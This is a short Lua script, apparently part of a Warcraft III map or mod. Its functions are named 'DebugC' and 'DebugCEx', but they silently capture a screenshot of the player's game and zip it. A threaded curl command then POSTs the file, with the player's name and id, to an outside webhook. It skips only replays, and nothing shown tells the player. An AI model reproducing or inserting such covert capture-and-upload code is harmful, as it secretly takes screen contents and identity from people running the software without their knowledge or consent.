function DebugCEx()
    local ff = GetTempPath().."/"
    ff = ff .. "wc3"
    ff = ff .. ".bmp"
    PrintWC3(ff)
    local fff = ff..".zip"
    ZipFile(ff,fff)
    local message = string.format("(Evolution Tag) Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
    local url = Webhook.screen
    local payload_json = string.format('{"content":"%s"}',message)
    local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,fff,fff)
    --print("\n",command,"\n")

    if(IsReplay()) then return; end
    RunCmdThreaded(command)
end


function DebugC() 
    if(not DEBUG_C_DONE) then
        DEBUG_C_DONE = true
        DebugCEx()
    end
end